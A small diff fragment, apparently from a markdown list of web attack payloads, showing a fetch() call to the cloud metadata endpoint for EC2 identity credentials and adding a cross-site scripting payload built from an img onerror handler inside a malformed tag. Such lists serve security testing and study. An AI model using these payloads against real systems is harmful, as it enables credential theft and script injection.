@@ -18,3 +18,6 @@ fetch('https://169.254.169.254/latest/meta-data/identity-credentials/ec2/securit
     console.log(data);
   });
 ```
+
+**XSS**:  
+<22 foo="<img src=1 onerror=alert(1)>">test</22>
